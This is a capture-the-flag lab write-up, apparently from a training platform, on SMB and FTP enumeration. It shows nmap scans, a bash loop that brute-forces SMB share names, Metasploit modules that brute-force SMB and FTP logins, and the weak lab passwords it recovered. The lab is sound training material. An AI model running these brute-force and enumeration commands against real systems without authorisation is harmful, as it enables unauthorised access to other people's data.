# Lab 03 – SMB and FTP Enumeration CTF  

This lab focused on enumerating SMB and FTP services on a Linux target. Four flags were hidden behind misconfigured network shares, weak credentials, and service banners.

## Flag 1 – Public SMB share with anonymous access  
**Hint:** *There is a samba share that allows anonymous access. Wonder what's in there!*  

A full TCP port scan of the target revealed SMB services running on ports 139 and 445:  

```bash
nmap -Pn -p- target.ine.local
```

Initial SMB enumeration with Metasploit’s `smb_enumusers` module identified several valid usernames, but no accessible public shares were found through direct listing.  

Using the provided `shares.txt` wordlist, a brute-force loop with `smbclient` was executed to discover valid share names:  

```bash
while read s; do
  out="$(smbclient //192.187.233.3/$s -N       --option='client min protocol=SMB2'       --option='client max protocol=SMB3'       -c 'ls' 2>&1)"
  if [ $? -eq 0 ] && ! echo "$out" | grep -q 'NT_STATUS_'; then
    echo "[+] Share válido: $s"
    echo "$out"
    break
  fi
done < /root/Desktop/wordlists/shares.txt
```

This revealed a share named `pubfiles` that allowed anonymous access. Connecting to it and listing its contents showed a text file containing the first flag:  

```bash
smbclient //192.187.233.3/pubfiles -N
smb: \> get flag1.txt
```

---

## Flag 2 – Private SMB share with weak credentials  
**Hint:** *One of the samba users have a bad password. Their private share with the same name as their username is at risk!*  

The usernames enumerated earlier were saved to a file and tested against the `unix_passwords.txt` wordlist using Metasploit’s `smb_login` module:  

```bash
use auxiliary/scanner/smb/smb_login
set USER_FILE /root/Desktop/smb_users
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

This revealed multiple accounts with weak credentials, including one user whose private SMB share matched their username. Connecting to this share provided a text file containing the second flag:  

```bash
smbclient //192.187.233.3/josh -U josh
Password: purple
smb: \> get flag2.txt
```

The file also contained a hint pointing to an FTP service.

---

## Flag 3 – Weak FTP credentials reveal another flag  
**Hint:** *Follow the hint given in the previous flag to uncover this one.*  

A targeted version scan identified port 5554 running an FTP service:  

```bash
nmap -p- -sV target.ine.local
```

Banner grabbing with Metasploit’s `ftp_version` module displayed a message naming three users with weak passwords:  

```bash
use auxiliary/scanner/ftp/ftp_version
set RHOSTS target.ine.local
set RPORT 5554
run
```

These usernames were saved to a file and tested against the provided `unix_passwords.txt` wordlist using the `ftp_login` module:  

```bash
use auxiliary/scanner/ftp/ftp_login
set USER_FILE /root/Desktop/ftp_users
set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
set RPORT 5554
set VERBOSE false
run
```

A valid set of credentials allowed connection to the FTP service, where a file named `flag3.txt` was retrieved:  

```bash
ftp target.ine.local 5554
Name: alice
Password: pretty
ftp> get flag3.txt
```

---

## Flag 4 – Warning banner on SSH login  
**Hint:** *This is a warning meant to deter unauthorized users from logging in.*  

The initial port scan also revealed SSH on port 22. Connecting directly to the service displayed a detailed warning banner that included the final flag:  

```bash
ssh target.ine.local
```

---

## Summary  

1. **Enumerated SMB users** with Metasploit and brute-forced share names to find a public share containing the first flag.  
2. **Brute-forced SMB credentials** to access a private share and locate the second flag, along with a hint to another service.  
3. **Followed the hint** to identify an FTP service, brute-forced its credentials, and retrieved a third flag.  
4. **Inspected the SSH service** directly to find the final flag embedded in its login banner.  

This lab demonstrated how weak credentials, exposed network shares, and verbose service banners can be chained to gain access to sensitive data without exploiting software vulnerabilities.

---

## Tools Used  

- **nmap** – host and service discovery  
- **Metasploit** – SMB/FTP enumeration and brute-force (`smb_enumusers`, `smb_login`, `ftp_version`, `ftp_login`)  
- **smbclient** – interact with SMB shares  
- **ftp** – interact with FTP service  
- **ssh** – retrieve SSH service banners  
